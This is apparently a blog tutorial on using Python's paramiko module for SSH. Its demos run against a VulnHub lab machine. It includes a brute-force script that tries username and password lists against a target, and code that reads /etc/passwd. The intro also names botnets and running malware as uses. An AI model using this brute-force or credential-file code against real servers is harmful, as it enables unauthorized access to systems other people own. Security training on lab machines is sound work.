---
title: "Python for hackers: paramiko"
date: 2022-09-26
draft: false
---

---

### **Python for hackers: paramiko**

![](https://cdn-images-1.medium.com/max/800/1*cHmfmYLtoze7wtcUFY5BVA.png)

### Introduction

Hello, in this article, we will get to know the *paramiko* module that allows us to establish SSH connections with Python.

### What is paramiko?

**SSH** (Secure Shell) is a cryptographic network protocol used for secure operation of network services over an unsecured network. With SSH, you can connect to and manage your network devices, Linux and Windows machines. It works on port 22 by default.

Paramiko is a module that allows us to easily make SSH connections with Python. In this way, we can write applications that manage remote servers with Python. For example; We can set up a botnet, run malware on a remote server, or write applications that scan for SSH vulnerabilities. Now let's see how to use this module.

### Installation

To install Paramiko, run the following code on the terminal screen.

```
pip install paramiko
```

Then we can open a python file and include the module in our project.

```
import paramiko
```

Now let's make an SSH connection with the paramiko module

### How to use Paramiko Module?

To establish an SSH connection with the Paramiko module;

```
import paramiko
```

```
IP = "ip address"  
USERNAME = "username"  
PASSWORD = "password"  
PORT = 22  
COMMAND = "command"
```

```
ssh = paramiko.SSHClient() # Create SSH object  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
```

```
ssh.connect(ip, username, password) # Establishing SSH connection  
stdin, stdout, stderr = ssh.exec_command(command) # Run command  
print(stdout.read())
```

```
ssh.close()
```

In this example, we created an SSH client with the pramaiko module. The application makes a connection to the specified IP and port address with the username and password information and runs the 'whoami' command. Then it prints the response to the screen and closes the SSH connection.

![](https://cdn-images-1.medium.com/max/800/1*yht4td7gjtuSn40eYD1_mQ.png)

In this example, we connected via SSH by running machine [Typhoon](https://www.vulnhub.com/entry/typhoon-102,267/) in the virtual environment. Now let's see what more we can do with this module.

### SSH brute force attack

Since we can make an SSH connection with Paramiko, we can also perform a brute force attack. For this, we will create a username list and a password list. Then we will try to establish an SSH connection with the information in this list.

```
import paramiko
```

```
ssh = paramiko.SSHClient()  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
username_list = []  
password_list = []
```

```
for i in username_list:  
    for j in password_list:  
        try:  
            ssh.connect(ip,username=i, password=j)  
            print(i,j)  
            ssh.close()  
        except:  
            pass
```

In the code above, a username list and a password list are required for the attack, you can add them to the lists in the code. The target IP address must also be given to the ssh.connect() function. Then, when the code is run, the values ​​in the username and password lists are tried one by one for the relevant IP address. In this process, make sure that the SSH service is turned on on the target server. Otherwise, the operation will fail.

### Pulling passwd file

If we establish an SSH connection, we can perform any operation we want with the shell we receive from the target server. For this we use the *ssh.exec\_command()* method.

```
import paramiko
```

```
ssh = paramiko.SSHClient()  
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
ssh.connect(ip, username, password)  
stdin, stdout, stderr = ssh.exec_command(“cat /etc/passwd”)  
print(stdout.read().decode(‘ascii’))
```

With the code above, we read the *passwd* file of the target server and printed it on the screen.

### End

As a result, we made an SSH connection to remote servers with the paramiko module and ran commands on the servers. I welcome comments on what other applications can be made with Paramiko…